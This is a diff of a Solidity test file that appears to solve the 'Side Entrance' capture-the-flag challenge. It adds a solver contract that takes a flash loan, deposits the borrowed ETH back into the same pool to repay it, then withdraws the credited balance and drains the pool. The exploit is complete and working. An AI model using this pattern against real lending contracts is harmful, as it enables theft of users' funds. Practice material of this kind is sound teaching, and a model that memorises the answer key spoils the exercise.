@@ -45,7 +45,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        ChallengeSolver solver = new ChallengeSolver(pool, recovery);
+        solver.run();
+        solver.withdraw();
     }
 
     /**
@@ -54,5 +56,41 @@ contract SideEntranceChallenge is Test {
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+    }
+}
+
+/*//////////////////////////////////////////////////////////////
+                            SOLUTION
+//////////////////////////////////////////////////////////////*/
+
+contract ChallengeSolver {
+    uint256 constant ETHER_IN_POOL = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
+    address recoveryAddress;
+    SideEntranceLenderPool lenderPool;
+
+    constructor(SideEntranceLenderPool pool, address recovery) {
+        lenderPool = pool;
+        recoveryAddress = recovery;
+    }
+
+    // needed to recieve eth during withdraw call
+    fallback() external payable {}
+
+    // user calls run to initiate flashloan
+    function run() public {
+        lenderPool.flashLoan(ETHER_IN_POOL);
+    }
+
+    // SideEntranceLenderPool flashloan function calls execute function on this contract
+    // we deposit the Eth back into the lender pool to get a deposited balance of 1000 Eth and pay back our flash loan
+    function execute() external payable {
+        lenderPool.deposit{value: ETHER_IN_POOL}();
+    }
+
+    // seperatly, call withdraw which should pass since out depositewd balance is now equal to the flashloan amount and send those funds to recovery address
+    function withdraw() public {
+        lenderPool.withdraw();
+        recoveryAddress.call{value: ETHER_IN_POOL}("");
     }
 }
